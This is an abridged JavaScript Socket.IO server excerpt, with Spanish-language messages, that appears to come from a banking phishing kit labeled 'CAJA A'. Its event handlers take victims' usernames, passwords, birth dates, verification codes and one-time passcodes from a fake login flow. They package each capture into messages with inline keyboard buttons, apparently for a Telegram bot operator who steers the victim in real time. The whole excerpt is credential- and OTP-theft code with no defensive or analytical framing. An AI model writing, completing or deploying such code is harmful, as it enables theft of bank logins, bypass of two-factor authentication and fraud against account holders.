...
io.on('connection', (socket) => {
  ...
  socket.on('dataForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
    ...
    const mensaje = `🔐 Nuevo intento de acceso CAJA A:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
  ...
  socket.on('codigoIngresado', ({ codigo, sessionId }) => {
    ...
    const mensaje = `🔍 El usuario ingresó el siguiente código CAJA A:\n\n🧾 Código: ${codigo}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
  ...
  socket.on('otpIngresado', ({ codigo, sessionId }) => {
    ...
    const mensaje = `📨 Reintento desde pantalla de error CAJA A:\n\n🧾 Nuevo código OTP: ${codigo}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
  ...
  socket.on('errorlogoForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
    ...
    const mensaje = `⚠️ Nuevo intento fallido detectado CAJA A:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}\n`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
